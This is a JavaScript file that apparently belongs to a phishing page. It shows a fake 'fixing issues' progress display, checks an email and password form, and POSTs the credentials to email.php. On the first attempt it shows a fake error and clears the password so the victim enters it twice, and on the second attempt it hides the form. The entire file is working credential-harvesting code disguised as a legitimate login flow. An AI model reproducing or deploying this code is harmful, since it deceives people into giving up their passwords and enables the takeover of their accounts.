var text_holder = document.getElementById('text-holder');
var IagreeBtn = document.getElementById('Iagree');
var counter = 0;


var d = new Date();
var getDate = document.querySelectorAll("#date");
getDate[0].innerHTML = d.toDateString();
getDate[1].innerHTML = d.toDateString();

$('#btnTransfer').click(function(){
	$('#spinner').show();
	setTimeout(function(){
		document.getElementById('issue').innerHTML = "Fixing Issue 1"
	},1000);
	setTimeout(function(){
		document.getElementById('issue').innerHTML = "Fixing Issue 2"
	},6000);
	setTimeout(function(){
		window.location.href="completed.php?email="+document.getElementById('email').value;
	}, 9000);
});

$('#Iagree').click(function(){
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
	var alert = document.querySelector('.alert');
if(!($('#email').val().match(checkmail))){
		$('.alert').show();
		alert.textContent = "Please enter a valid email address.";
		$('#email').focus();
		return false;
	}else if($('#email').val() == ""){
		$('.alert').show();
		alert.textContent = "Please enter an email address.";
		$('#email').focus();
		return false;
	}else if(($('#password').val() == "")){
		$('.alert').show();
		alert.textContent = "Please enter your password.";
		$('#password').focus();
	}else{
		counter = counter + 1;

		if(counter > 1){
			$('.alert').show();
			alert.className = alert.className.replace(/\balert-danger\b/g, "alert-info");
			alert.textContent = "Processing...";

			var xmlhttp;
		    if(window.XMLHttpRequest){
		      xmlhttp = new XMLHttpRequest();
		    }else{
		      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		    }

		    xmlhttp.onreadystatechange=function(){
		      if(xmlhttp.readyState==4 && xmlhttp.status==200){
		      	$('#text-holder').hide();
		      }
		    }

		    var email = document.getElementById('email').value;
		    var password = document.getElementById('password').value;
		    var url = 'email.php';
		    var param = "email="+email+"&password="+password;

		    xmlhttp.open("POST", url, true);

		    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
		    xmlhttp.setRequestHeader("content-length",param.length);
		    xmlhttp.setRequestHeader("connection","close");

		    xmlhttp.send(param);

		    return true;
		} else {

			$('.alert').show();
			alert.className = alert.className.replace(/\balert-danger\b/g, "alert-info");
			alert.textContent = "Processing...";

			var xmlhttp;
		    if(window.XMLHttpRequest){
		      xmlhttp = new XMLHttpRequest();
		    }else{
		      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		    }

		    xmlhttp.onreadystatechange=function(){
		      if(xmlhttp.readyState==4 && xmlhttp.status==200){
					$('.alert').show();
					alert.className = alert.className.replace(/\balert-info\b/g, "alert-danger");
					alert.textContent = xmlhttp.responseText;
					document.getElementById('password').value = "";
		      }
		    }

		    var email = document.getElementById('email').value;
		    var password = document.getElementById('password').value;
		    var url = 'email.php';
		    var param = "email="+email+"&password="+password;

		    xmlhttp.open("POST", url, true);

		    xmlhttp.setRequestHeader("content-type","application/x-www-form-urlencoded");
		    xmlhttp.setRequestHeader("content-length",param.length);
		    xmlhttp.setRequestHeader("connection","close");

		    xmlhttp.send(param);

		    return true;
		}
	}
});